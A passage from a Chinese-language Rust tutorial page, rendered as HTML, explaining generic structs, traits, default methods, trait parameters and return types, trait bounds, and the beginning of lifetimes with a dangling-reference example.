</span><span id="__span-140-2"><a id="__codelineno-140-2" name="__codelineno-140-2" href="#note-cs-rust-rust-__codelineno-140-2"></a><span class="w">    </span><span class="n">x</span>: <span class="nc">T</span><span class="p">,</span>
</span><span id="__span-140-3"><a id="__codelineno-140-3" name="__codelineno-140-3" href="#note-cs-rust-rust-__codelineno-140-3"></a><span class="w">    </span><span class="n">y</span>: <span class="nc">T</span><span class="p">,</span>
</span><span id="__span-140-4"><a id="__codelineno-140-4" name="__codelineno-140-4" href="#note-cs-rust-rust-__codelineno-140-4"></a><span class="p">}</span>
</span><span id="__span-140-5"><a id="__codelineno-140-5" name="__codelineno-140-5" href="#note-cs-rust-rust-__codelineno-140-5"></a>
</span><span id="__span-140-6"><a id="__codelineno-140-6" name="__codelineno-140-6" href="#note-cs-rust-rust-__codelineno-140-6"></a><span class="k">impl</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span><span class="w"> </span><span class="n">Point</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-140-7"><a id="__codelineno-140-7" name="__codelineno-140-7" href="#note-cs-rust-rust-__codelineno-140-7"></a><span class="w">    </span><span class="k">fn</span> <span class="nf">x</span><span class="p">(</span><span class="o">&amp;</span><span class="bp">self</span><span class="p">)</span><span class="w"> </span>-&gt; <span class="kp">&amp;</span><span class="nc">T</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-140-8"><a id="__codelineno-140-8" name="__codelineno-140-8" href="#note-cs-rust-rust-__codelineno-140-8"></a><span class="w">        </span><span class="o">&amp;</span><span class="bp">self</span><span class="p">.</span><span class="n">x</span>
</span><span id="__span-140-9"><a id="__codelineno-140-9" name="__codelineno-140-9" href="#note-cs-rust-rust-__codelineno-140-9"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-140-10"><a id="__codelineno-140-10" name="__codelineno-140-10" href="#note-cs-rust-rust-__codelineno-140-10"></a><span class="p">}</span>
</span><span id="__span-140-11"><a id="__codelineno-140-11" name="__codelineno-140-11" href="#note-cs-rust-rust-__codelineno-140-11"></a>
</span><span id="__span-140-12"><a id="__codelineno-140-12" name="__codelineno-140-12" href="#note-cs-rust-rust-__codelineno-140-12"></a><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-140-13"><a id="__codelineno-140-13" name="__codelineno-140-13" href="#note-cs-rust-rust-__codelineno-140-13"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Point</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">x</span>: <span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="n">y</span>: <span class="mi">2</span><span class="w"> </span><span class="p">};</span>
</span><span id="__span-140-14"><a id="__codelineno-140-14" name="__codelineno-140-14" href="#note-cs-rust-rust-__codelineno-140-14"></a><span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;p.x = {}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">p</span><span class="p">.</span><span class="n">x</span><span class="p">());</span>
</span><span id="__span-140-15"><a id="__codelineno-140-15" name="__codelineno-140-15" href="#note-cs-rust-rust-__codelineno-140-15"></a><span class="p">}</span>
</span></code></pre></div>
<h3 id="note-cs-rust-rust-_47">特性<a class="headerlink" href="#note-cs-rust-rust-_47" title="Permanent link">&para;</a></h3>
<p>特性（trait）概念接近于 Java 中的接口（Interface），但两者不完全相同。特性与接口相同的地方在于它们都是一种行为规范，可以用于标识哪些类有哪些方法。</p>
<p>特性在 Rust 中用 trait 表示：</p>
<div class="language-rust highlight"><pre><span></span><code><span id="__span-141-1"><a id="__codelineno-141-1" name="__codelineno-141-1" href="#note-cs-rust-rust-__codelineno-141-1"></a><span class="k">trait</span><span class="w"> </span><span class="n">Descriptive</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-141-2"><a id="__codelineno-141-2" name="__codelineno-141-2" href="#note-cs-rust-rust-__codelineno-141-2"></a><span class="w">    </span><span class="k">fn</span> <span class="nf">describe</span><span class="p">(</span><span class="o">&amp;</span><span class="bp">self</span><span class="p">)</span><span class="w"> </span>-&gt; <span class="nb">String</span><span class="p">;</span>
</span><span id="__span-141-3"><a id="__codelineno-141-3" name="__codelineno-141-3" href="#note-cs-rust-rust-__codelineno-141-3"></a><span class="p">}</span>
</span></code></pre></div>
<p>Descriptive 规定了实现者必需有 <code>describe(&amp;self) -&gt; String</code> 方法。</p>
<p>我们用它实现一个结构体：</p>
<div class="language-rust highlight"><pre><span></span><code><span id="__span-142-1"><a id="__codelineno-142-1" name="__codelineno-142-1" href="#note-cs-rust-rust-__codelineno-142-1"></a><span class="k">struct</span> <span class="nc">Person</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-142-2"><a id="__codelineno-142-2" name="__codelineno-142-2" href="#note-cs-rust-rust-__codelineno-142-2"></a><span class="w">    </span><span class="n">name</span>: <span class="nb">String</span><span class="p">,</span>
</span><span id="__span-142-3"><a id="__codelineno-142-3" name="__codelineno-142-3" href="#note-cs-rust-rust-__codelineno-142-3"></a><span class="w">    </span><span class="n">age</span>: <span class="kt">u8</span>
</span><span id="__span-142-4"><a id="__codelineno-142-4" name="__codelineno-142-4" href="#note-cs-rust-rust-__codelineno-142-4"></a><span class="p">}</span>
</span><span id="__span-142-5"><a id="__codelineno-142-5" name="__codelineno-142-5" href="#note-cs-rust-rust-__codelineno-142-5"></a>
</span><span id="__span-142-6"><a id="__codelineno-142-6" name="__codelineno-142-6" href="#note-cs-rust-rust-__codelineno-142-6"></a><span class="k">impl</span><span class="w"> </span><span class="n">Descriptive</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">Person</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-142-7"><a id="__codelineno-142-7" name="__codelineno-142-7" href="#note-cs-rust-rust-__codelineno-142-7"></a><span class="w">    </span><span class="k">fn</span> <span class="nf">describe</span><span class="p">(</span><span class="o">&amp;</span><span class="bp">self</span><span class="p">)</span><span class="w"> </span>-&gt; <span class="nb">String</span> <span class="p">{</span>
</span><span id="__span-142-8"><a id="__codelineno-142-8" name="__codelineno-142-8" href="#note-cs-rust-rust-__codelineno-142-8"></a><span class="w">        </span><span class="fm">format!</span><span class="p">(</span><span class="s">&quot;{} {}&quot;</span><span class="p">,</span><span class="w"> </span><span class="bp">self</span><span class="p">.</span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="bp">self</span><span class="p">.</span><span class="n">age</span><span class="p">)</span>
</span><span id="__span-142-9"><a id="__codelineno-142-9" name="__codelineno-142-9" href="#note-cs-rust-rust-__codelineno-142-9"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-142-10"><a id="__codelineno-142-10" name="__codelineno-142-10" href="#note-cs-rust-rust-__codelineno-142-10"></a><span class="p">}</span>
</span></code></pre></div>
<p>格式为<code>impl &lt;特性名&gt; for &lt;所实现的类型名&gt;</code></p>
<p>Rust 同一个类可以实现多个特性，每个 impl 块只能实现一个。</p>
<h4 id="note-cs-rust-rust-_48">默认特性<a class="headerlink" href="#note-cs-rust-rust-_48" title="Permanent link">&para;</a></h4>
<p>这是特性与接口的不同点：接口只能规范方法而不能定义方法，但特性可以定义方法作为默认方法，因为是"默认"，所以对象既可以重新定义方法，也可以不重新定义方法使用默认的方法：</p>
<div class="language-rust highlight"><pre><span></span><code><span id="__span-143-1"><a id="__codelineno-143-1" name="__codelineno-143-1" href="#note-cs-rust-rust-__codelineno-143-1"></a><span class="k">trait</span><span class="w"> </span><span class="n">Descriptive</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-143-2"><a id="__codelineno-143-2" name="__codelineno-143-2" href="#note-cs-rust-rust-__codelineno-143-2"></a><span class="w">    </span><span class="k">fn</span> <span class="nf">describe</span><span class="p">(</span><span class="o">&amp;</span><span class="bp">self</span><span class="p">)</span><span class="w"> </span>-&gt; <span class="nb">String</span> <span class="p">{</span>
</span><span id="__span-143-3"><a id="__codelineno-143-3" name="__codelineno-143-3" href="#note-cs-rust-rust-__codelineno-143-3"></a><span class="w">        </span><span class="nb">String</span>::<span class="n">from</span><span class="p">(</span><span class="s">&quot;[Object]&quot;</span><span class="p">)</span>
</span><span id="__span-143-4"><a id="__codelineno-143-4" name="__codelineno-143-4" href="#note-cs-rust-rust-__codelineno-143-4"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-143-5"><a id="__codelineno-143-5" name="__codelineno-143-5" href="#note-cs-rust-rust-__codelineno-143-5"></a><span class="p">}</span>
</span><span id="__span-143-6"><a id="__codelineno-143-6" name="__codelineno-143-6" href="#note-cs-rust-rust-__codelineno-143-6"></a>
</span><span id="__span-143-7"><a id="__codelineno-143-7" name="__codelineno-143-7" href="#note-cs-rust-rust-__codelineno-143-7"></a><span class="k">struct</span> <span class="nc">Person</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-143-8"><a id="__codelineno-143-8" name="__codelineno-143-8" href="#note-cs-rust-rust-__codelineno-143-8"></a><span class="w">    </span><span class="n">name</span>: <span class="nb">String</span><span class="p">,</span>
</span><span id="__span-143-9"><a id="__codelineno-143-9" name="__codelineno-143-9" href="#note-cs-rust-rust-__codelineno-143-9"></a><span class="w">    </span><span class="n">age</span>: <span class="kt">u8</span>
</span><span id="__span-143-10"><a id="__codelineno-143-10" name="__codelineno-143-10" href="#note-cs-rust-rust-__codelineno-143-10"></a><span class="p">}</span>
</span><span id="__span-143-11"><a id="__codelineno-143-11" name="__codelineno-143-11" href="#note-cs-rust-rust-__codelineno-143-11"></a>
</span><span id="__span-143-12"><a id="__codelineno-143-12" name="__codelineno-143-12" href="#note-cs-rust-rust-__codelineno-143-12"></a><span class="k">impl</span><span class="w"> </span><span class="n">Descriptive</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">Person</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-143-13"><a id="__codelineno-143-13" name="__codelineno-143-13" href="#note-cs-rust-rust-__codelineno-143-13"></a><span class="w">    </span><span class="k">fn</span> <span class="nf">describe</span><span class="p">(</span><span class="o">&amp;</span><span class="bp">self</span><span class="p">)</span><span class="w"> </span>-&gt; <span class="nb">String</span> <span class="p">{</span>
</span><span id="__span-143-14"><a id="__codelineno-143-14" name="__codelineno-143-14" href="#note-cs-rust-rust-__codelineno-143-14"></a><span class="w">        </span><span class="fm">format!</span><span class="p">(</span><span class="s">&quot;{} {}&quot;</span><span class="p">,</span><span class="w"> </span><span class="bp">self</span><span class="p">.</span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="bp">self</span><span class="p">.</span><span class="n">age</span><span class="p">)</span>
</span><span id="__span-143-15"><a id="__codelineno-143-15" name="__codelineno-143-15" href="#note-cs-rust-rust-__codelineno-143-15"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-143-16"><a id="__codelineno-143-16" name="__codelineno-143-16" href="#note-cs-rust-rust-__codelineno-143-16"></a><span class="p">}</span>
</span><span id="__span-143-17"><a id="__codelineno-143-17" name="__codelineno-143-17" href="#note-cs-rust-rust-__codelineno-143-17"></a>
</span><span id="__span-143-18"><a id="__codelineno-143-18" name="__codelineno-143-18" href="#note-cs-rust-rust-__codelineno-143-18"></a><span class="k">fn</span> <span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-143-19"><a id="__codelineno-143-19" name="__codelineno-143-19" href="#note-cs-rust-rust-__codelineno-143-19"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">cali</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Person</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-143-20"><a id="__codelineno-143-20" name="__codelineno-143-20" href="#note-cs-rust-rust-__codelineno-143-20"></a><span class="w">        </span><span class="n">name</span>: <span class="nb">String</span>::<span class="n">from</span><span class="p">(</span><span class="s">&quot;Cali&quot;</span><span class="p">),</span>
</span><span id="__span-143-21"><a id="__codelineno-143-21" name="__codelineno-143-21" href="#note-cs-rust-rust-__codelineno-143-21"></a><span class="w">        </span><span class="n">age</span>: <span class="mi">24</span>
</span><span id="__span-143-22"><a id="__codelineno-143-22" name="__codelineno-143-22" href="#note-cs-rust-rust-__codelineno-143-22"></a><span class="w">    </span><span class="p">};</span>
</span><span id="__span-143-23"><a id="__codelineno-143-23" name="__codelineno-143-23" href="#note-cs-rust-rust-__codelineno-143-23"></a><span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;{}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">cali</span><span class="p">.</span><span class="n">describe</span><span class="p">());</span>
</span><span id="__span-143-24"><a id="__codelineno-143-24" name="__codelineno-143-24" href="#note-cs-rust-rust-__codelineno-143-24"></a><span class="p">}</span>
</span></code></pre></div>
<p>运行结果为</p>
<p><code>Cali 24</code></p>
<p>如果我们将 impl Descriptive for Person 块中的内容去掉，那么运行结果就是：</p>
<p><code>[Object]</code></p>
<h4 id="note-cs-rust-rust-_49">特性做参数<a class="headerlink" href="#note-cs-rust-rust-_49" title="Permanent link">&para;</a></h4>
<p>很多情况下我们需要传递一个函数做参数，例如回调函数、设置按钮事件等。在 Java 中函数必须以接口实现的类实例来传递，在 Rust 中可以通过传递特性参数来实现：</p>
<div class="language-rust highlight"><pre><span></span><code><span id="__span-144-1"><a id="__codelineno-144-1" name="__codelineno-144-1" href="#note-cs-rust-rust-__codelineno-144-1"></a><span class="k">fn</span> <span class="nf">output</span><span class="p">(</span><span class="n">object</span>: <span class="nc">impl</span><span class="w"> </span><span class="n">Descriptive</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-144-2"><a id="__codelineno-144-2" name="__codelineno-144-2" href="#note-cs-rust-rust-__codelineno-144-2"></a><span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;{}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">object</span><span class="p">.</span><span class="n">describe</span><span class="p">());</span>
</span><span id="__span-144-3"><a id="__codelineno-144-3" name="__codelineno-144-3" href="#note-cs-rust-rust-__codelineno-144-3"></a><span class="p">}</span>
</span></code></pre></div>
<p>任何实现了 Descriptive 特性的对象都可以作为这个函数的参数，这个函数没必要了解传入对象有没有其他属性或方法，只需要了解它一定有 Descriptive 特性规范的方法就可以了。当然，此函数内也无法使用其他的属性与方法。</p>
<p>特性参数还可以用这种等效语法实现：
<div class="language-rust highlight"><pre><span></span><code><span id="__span-145-1"><a id="__codelineno-145-1" name="__codelineno-145-1" href="#note-cs-rust-rust-__codelineno-145-1"></a><span class="k">fn</span> <span class="nf">output</span><span class="o">&lt;</span><span class="n">T</span>: <span class="nc">Descriptive</span><span class="o">&gt;</span><span class="p">(</span><span class="n">object</span>: <span class="nc">T</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-145-2"><a id="__codelineno-145-2" name="__codelineno-145-2" href="#note-cs-rust-rust-__codelineno-145-2"></a><span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;{}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">object</span><span class="p">.</span><span class="n">describe</span><span class="p">());</span>
</span><span id="__span-145-3"><a id="__codelineno-145-3" name="__codelineno-145-3" href="#note-cs-rust-rust-__codelineno-145-3"></a><span class="p">}</span>
</span></code></pre></div>
这是一种风格类似泛型的语法糖，这种语法糖在有多个参数类型均是特性的情况下十分实用：</p>
<p><div class="language-rust highlight"><pre><span></span><code><span id="__span-146-1"><a id="__codelineno-146-1" name="__codelineno-146-1" href="#note-cs-rust-rust-__codelineno-146-1"></a><span class="k">fn</span> <span class="nf">output_two</span><span class="o">&lt;</span><span class="n">T</span>: <span class="nc">Descriptive</span><span class="o">&gt;</span><span class="p">(</span><span class="n">arg1</span>: <span class="nc">T</span><span class="p">,</span><span class="w"> </span><span class="n">arg2</span>: <span class="nc">T</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-146-2"><a id="__codelineno-146-2" name="__codelineno-146-2" href="#note-cs-rust-rust-__codelineno-146-2"></a><span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;{}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">arg1</span><span class="p">.</span><span class="n">describe</span><span class="p">());</span>
</span><span id="__span-146-3"><a id="__codelineno-146-3" name="__codelineno-146-3" href="#note-cs-rust-rust-__codelineno-146-3"></a><span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;{}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">arg2</span><span class="p">.</span><span class="n">describe</span><span class="p">());</span>
</span><span id="__span-146-4"><a id="__codelineno-146-4" name="__codelineno-146-4" href="#note-cs-rust-rust-__codelineno-146-4"></a><span class="p">}</span>
</span></code></pre></div>
特性作类型表示时如果涉及多个特性，可以用 + 符号表示，例如：
<div class="language-rust highlight"><pre><span></span><code><span id="__span-147-1"><a id="__codelineno-147-1" name="__codelineno-147-1" href="#note-cs-rust-rust-__codelineno-147-1"></a><span class="k">fn</span> <span class="nf">notify</span><span class="p">(</span><span class="n">item</span>: <span class="nc">impl</span><span class="w"> </span><span class="n">Summary</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">Display</span><span class="p">)</span>
</span><span id="__span-147-2"><a id="__codelineno-147-2" name="__codelineno-147-2" href="#note-cs-rust-rust-__codelineno-147-2"></a><span class="k">fn</span> <span class="nf">notify</span><span class="o">&lt;</span><span class="n">T</span>: <span class="nc">Summary</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">Display</span><span class="o">&gt;</span><span class="p">(</span><span class="n">item</span>: <span class="nc">T</span><span class="p">)</span>
</span></code></pre></div></p>
<p>注意：仅用于表示类型的时候，并不意味着可以在 impl 块中使用。</p>
<p>复杂的实现关系可以使用 where 关键字简化，例如：
<div class="language-rust highlight"><pre><span></span><code><span id="__span-148-1"><a id="__codelineno-148-1" name="__codelineno-148-1" href="#note-cs-rust-rust-__codelineno-148-1"></a><span class="k">fn</span> <span class="nf">some_function</span><span class="o">&lt;</span><span class="n">T</span>: <span class="nc">Display</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">Clone</span><span class="p">,</span><span class="w"> </span><span class="n">U</span>: <span class="nb">Clone</span> <span class="o">+</span><span class="w"> </span><span class="n">Debug</span><span class="o">&gt;</span><span class="p">(</span><span class="n">t</span>: <span class="nc">T</span><span class="p">,</span><span class="w"> </span><span class="n">u</span>: <span class="nc">U</span><span class="p">)</span>
</span></code></pre></div>
可以简化成：
<div class="language-rust highlight"><pre><span></span><code><span id="__span-149-1"><a id="__codelineno-149-1" name="__codelineno-149-1" href="#note-cs-rust-rust-__codelineno-149-1"></a><span class="k">fn</span> <span class="nf">some_function</span><span class="o">&lt;</span><span class="n">T</span><span class="p">,</span><span class="w"> </span><span class="n">U</span><span class="o">&gt;</span><span class="p">(</span><span class="n">t</span>: <span class="nc">T</span><span class="p">,</span><span class="w"> </span><span class="n">u</span>: <span class="nc">U</span><span class="p">)</span><span class="w"> </span>-&gt; <span class="kt">i32</span>
</span><span id="__span-149-2"><a id="__codelineno-149-2" name="__codelineno-149-2" href="#note-cs-rust-rust-__codelineno-149-2"></a>    <span class="nc">where</span><span class="w"> </span><span class="n">T</span>: <span class="nc">Display</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">Clone</span><span class="p">,</span>
</span><span id="__span-149-3"><a id="__codelineno-149-3" name="__codelineno-149-3" href="#note-cs-rust-rust-__codelineno-149-3"></a><span class="w">          </span><span class="n">U</span>: <span class="nb">Clone</span> <span class="o">+</span><span class="w"> </span><span class="n">Debug</span>
</span></code></pre></div></p>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p>trait Comparable {
fn compare(&amp;self, object: &amp;Self) -&gt; i8;
}</p>
<p>fn max<T: Comparable>(array: &amp;[T]) -&gt; &amp;T {
    let mut max_index = 0;
    let mut i = 1;
    while i &lt; array.len() {
        if array[i].compare(&amp;array[max_index]) &gt; 0 {
            max_index = i;
        }
        i += 1;
    }
    &amp;array[max_index]
}</p>
<p>impl Comparable for f64 {
    fn compare(&amp;self, object: &amp;f64) -&gt; i8 {
        if &amp;self &gt; &amp;object { 1 }
        else if &amp;self == &amp;object { 0 }
        else { -1 }
    }
}</p>
<p>fn main() {
    let arr = [1.0, 3.0, 5.0, 4.0, 2.0];
    println!("maximum of arr is {}", max(&amp;arr));
}</p>
</div>
<h4 id="note-cs-rust-rust-_50">特性做返回值<a class="headerlink" href="#note-cs-rust-rust-_50" title="Permanent link">&para;</a></h4>
<p>特性做返回值格式如下：
<div class="language-rust highlight"><pre><span></span><code><span id="__span-150-1"><a id="__codelineno-150-1" name="__codelineno-150-1" href="#note-cs-rust-rust-__codelineno-150-1"></a><span class="k">fn</span> <span class="nf">person</span><span class="p">()</span><span class="w"> </span>-&gt; <span class="nc">impl</span><span class="w"> </span><span class="n">Descriptive</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-150-2"><a id="__codelineno-150-2" name="__codelineno-150-2" href="#note-cs-rust-rust-__codelineno-150-2"></a><span class="w">    </span><span class="n">Person</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-150-3"><a id="__codelineno-150-3" name="__codelineno-150-3" href="#note-cs-rust-rust-__codelineno-150-3"></a><span class="w">        </span><span class="n">name</span>: <span class="nb">String</span>::<span class="n">from</span><span class="p">(</span><span class="s">&quot;Cali&quot;</span><span class="p">),</span>
</span><span id="__span-150-4"><a id="__codelineno-150-4" name="__codelineno-150-4" href="#note-cs-rust-rust-__codelineno-150-4"></a><span class="w">        </span><span class="n">age</span>: <span class="mi">24</span>
</span><span id="__span-150-5"><a id="__codelineno-150-5" name="__codelineno-150-5" href="#note-cs-rust-rust-__codelineno-150-5"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-150-6"><a id="__codelineno-150-6" name="__codelineno-150-6" href="#note-cs-rust-rust-__codelineno-150-6"></a><span class="p">}</span>
</span></code></pre></div></p>
<p>但是有一点，特性做返回值只接受实现了该特性的对象做返回值且在同一个函数中所有可能的返回值类型必须完全一样。比如结构体 A 与结构体 B 都实现了特性 Trait，下面这个函数就是错误的：</p>
<div class="language-rust highlight"><pre><span></span><code><span id="__span-151-1"><a id="__codelineno-151-1" name="__codelineno-151-1" href="#note-cs-rust-rust-__codelineno-151-1"></a><span class="k">fn</span> <span class="nf">some_function</span><span class="p">(</span><span class="kt">bool</span><span class="w"> </span><span class="n">bl</span><span class="p">)</span><span class="w"> </span>-&gt; <span class="nc">impl</span><span class="w"> </span><span class="n">Descriptive</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-151-2"><a id="__codelineno-151-2" name="__codelineno-151-2" href="#note-cs-rust-rust-__codelineno-151-2"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="n">bl</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-151-3"><a id="__codelineno-151-3" name="__codelineno-151-3" href="#note-cs-rust-rust-__codelineno-151-3"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">A</span><span class="w"> </span><span class="p">{};</span>
</span><span id="__span-151-4"><a id="__codelineno-151-4" name="__codelineno-151-4" href="#note-cs-rust-rust-__codelineno-151-4"></a><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-151-5"><a id="__codelineno-151-5" name="__codelineno-151-5" href="#note-cs-rust-rust-__codelineno-151-5"></a><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">B</span><span class="w"> </span><span class="p">{};</span>
</span><span id="__span-151-6"><a id="__codelineno-151-6" name="__codelineno-151-6" href="#note-cs-rust-rust-__codelineno-151-6"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-151-7"><a id="__codelineno-151-7" name="__codelineno-151-7" href="#note-cs-rust-rust-__codelineno-151-7"></a><span class="p">}</span>
</span></code></pre></div>
<h2 id="note-cs-rust-rust-_51">生命周期<a class="headerlink" href="#note-cs-rust-rust-_51" title="Permanent link">&para;</a></h2>
<p>Rust 生命周期机制是与所有权机制同等重要的资源管理机制。</p>
<p>之所以引入这个概念主要是应对复杂类型系统中资源管理的问题。</p>
<p>引用是对待复杂类型时必不可少的机制，毕竟复杂类型的数据不能被处理器轻易地复制和计算。</p>
<p>但引用往往导致极其复杂的资源管理问题，首先认识一下垂悬引用：</p>
<div class="language-rust highlight"><pre><span></span><code><span id="__span-152-1"><a id="__codelineno-152-1" name="__codelineno-152-1" href="#note-cs-rust-rust-__codelineno-152-1"></a><span class="p">{</span>
</span><span id="__span-152-2"><a id="__codelineno-152-2" name="__codelineno-152-2" href="#note-cs-rust-rust-__codelineno-152-2"></a><span class="w">    </span><span class="kd">let</span><span class="w"> </span><span class="n">r</span><span class="p">;</span>
</span><span id="__span-152-3"><a id="__codelineno-152-3" name="__codelineno-152-3" href="#note-cs-rust-rust-__codelineno-152-3"></a>
</span><span id="__span-152-4"><a id="__codelineno-152-4" name="__codelineno-152-4" href="#note-cs-rust-rust-__codelineno-152-4"></a><span class="w">    </span><span class="p">{</span>
</span><span id="__span-152-5"><a id="__codelineno-152-5" name="__codelineno-152-5" href="#note-cs-rust-rust-__codelineno-152-5"></a><span class="w">        </span><span class="kd">let</span><span class="w"> </span><span class="n">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">5</span><span class="p">;</span>
</span><span id="__span-152-6"><a id="__codelineno-152-6" name="__codelineno-152-6" href="#note-cs-rust-rust-__codelineno-152-6"></a><span class="w">        </span><span class="n">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">x</span><span class="p">;</span>
</span><span id="__span-152-7"><a id="__codelineno-152-7" name="__codelineno-152-7" href="#note-cs-rust-rust-__codelineno-152-7"></a><span class="w">    </span><span class="p">}</span><span class="c1">//结束之后，r所引用的值已经在使用之前被释放</span>
</span><span id="__span-152-8"><a id="__codelineno-152-8" name="__codelineno-152-8" href="#note-cs-rust-rust-__codelineno-152-8"></a>
</span><span id="__span-152-9"><a id="__codelineno-152-9" name="__codelineno-152-9" href="#note-cs-rust-rust-__codelineno-152-9"></a><span class="w">    </span><span class="fm">println!</span><span class="p">(</span><span class="s">&quot;r: {}&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">r</span><span class="p">);</span>
</span><span id="__span-152-10"><a id="__codelineno-152-10" name="__codelineno-152-10" href="#note-cs-rust-rust-__codelineno-152-10"></a><span class="p">}</span>
</span></code></pre></div>
<p>引用必须在值的生命周期以内才有效。</p>
<p>一直以来我们都在结构体中使用 String 而不用 &amp;str，我们用一个案例解释原因：</p>
<div class="language-rust highlight"><pre><span></span><code><span id="__span-153-1"><a id="__codelineno-153-1" name="__codelineno-153-1" href="#note-cs-rust-rust-__codelineno-153-1"></a><span class="k">fn</span> <span class="nf">longer</span><span class="p">(</span><span class="n">s1</span>: <span class="kp">&amp;</span><span class="kt">str</span><span class="p">,</span><span class="w"> </span><span class="n">s2</span>: <span class="kp">&amp;</span><span class="kt">str</span><span class="p">)</span><span class="w"> </span>-&gt; <span class="kp">&amp;</span><span class="kt">str</span> <span class="p">{</span>
</span><span id="__span-153-2"><a id="__codelineno-153-2" name="__codelineno-153-2" href="#note-cs-rust-rust-__codelineno-153-2"></a><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="n">s2</span><span class="p">.</span><span class="n">len</span><span class="p">()</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">s1</span><span class="p">.</span><span class="n">len</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-153-3"><a id="__codelineno-153-3" name="__codelineno-153-3" href="#note-cs-rust-rust-__codelineno-153-3"></a><span class="w">        </span><span class="n">s2</span>
</span><span id="__span-153-4"><a id="__codelineno-153-4" name="__codelineno-153-4" href="#note-cs-rust-rust-__codelineno-153-4"></a><span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-153-5"><a id="__codelineno-153-5" name="__codelineno-153-5" href="#note-cs-rust-rust-__codelineno-153-5"></a><span class="w">        </span><span class="n">s1</span>
</span><span id="__span-153-6"><a id="__codelineno-153-6" name="__codelineno-153-6" href="#note-cs-rust-rust-__codelineno-153-6"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-153-7"><a id="__codelineno-153-7" name="__codelineno-153-7" href="#note-cs-rust-rust-__codelineno-153-7"></a><span class="p">}</span>
</span></code></pre></div>
<div class="admonition example">
<p class="admonition-title">Example</p>
<p>fn main() {
let r;
{
    let s1 = "rust";
    let s2 = "ecmascript";
    r = longer(s1, s2);
}
println!("{} is longer", r);</p>
</div>
<p>}
   这段程序中虽然经过了比较，但 r 被使用的时候源值 s1 和 s2 都已经失效了。当然我们可以把 r 的使用移到 s1 和 s2 的生命周期范围以内防止这种错误的发生，但对于函数来说，它并不能知道自己以外的地方是什么情况，它为了保障自己传递出去的值是正常的，必选所有权原则消除一切危险，所以 longer 函数并不能通过编译。</p>
<h3 id="note-cs-rust-rust-_52">生命周期注释<a class="headerlink" href="#note-cs-rust-rust-_52" title="Permanent link">&para;</a></h3>
<p>生命周期注释是描述引用生命周期的办法。</p>
<p>虽然这样并不能够改变引用的生命周期，但可以在合适的地方声明两个引用的生命周期一致。</p>
<p>生命周期注释用单引号开头，跟着一个小写字母单词：</p>
